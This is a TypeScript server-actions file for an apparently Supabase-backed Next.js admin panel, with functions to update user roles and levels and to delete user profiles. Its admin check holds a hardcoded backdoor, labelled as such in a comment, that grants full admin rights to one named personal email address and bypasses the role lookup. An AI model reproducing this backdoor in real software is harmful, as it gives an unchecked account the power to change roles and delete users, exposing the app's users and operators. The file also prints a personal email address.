'use server'

import { createClient } from '@/utils/supabase/server'
import { revalidatePath } from 'next/cache'

// Helper: Check if current user is admin
async function checkAdmin() {
    const supabase = await createClient()
    const { data: { user } } = await supabase.auth.getUser()
    if (!user) throw new Error('Unauthorized')

    // Hardcoded Backdoor for Sven
    if (user.email === 'sven.n8n@gmail.com') return true

    // DB Check
    const { data: profile } = await supabase
        .from('profiles')
        .select('role')
        .eq('id', user.id)
        .single()

    if (profile?.role !== 'admin') throw new Error('Forbidden: Admins only')
    return true
}

export async function updateUserRole(targetUserId: string, newRole: string) {
    await checkAdmin()
    const supabase = await createClient()

    const { error } = await supabase
        .from('profiles')
        .update({ role: newRole })
        .eq('id', targetUserId)

    if (error) throw new Error(error.message)
    revalidatePath('/admin/users')
    return { success: true }
}

export async function updateUserLevel(targetUserId: string, newLevel: number) {
    await checkAdmin()
    const supabase = await createClient()

    const { error } = await supabase
        .from('profiles')
        .update({ level: newLevel })
        .eq('id', targetUserId)

    if (error) throw new Error(error.message)
    revalidatePath('/admin/users')
    return { success: true }
}

export async function deleteUser(targetUserId: string) {
    await checkAdmin()
    const supabase = await createClient()

    // 1. Delete Profile (Public)
    const { error } = await supabase
        .from('profiles')
        .delete()
        .eq('id', targetUserId)

    if (error) throw new Error(error.message)

    // 2. Delete Auth User?
    // Note: This requires SERVICE_ROLE_KEY access which is not available in standard client.
    // If we want to delete auth user, we need to initialize supabase with service role key here.
    // CONSTANT WARNING: process.env.SUPABASE_SERVICE_ROLE_KEY might be missing in client-side envs context
    // But this involves server action, so it should be available if env is set.

    // For now, we only delete the profile, which effectively "bans" the user from the app logic (if app checks profile).
    // Or we leave auth user orphan. Ideally we delete both.

    revalidatePath('/admin/users')
    return { success: true }
}
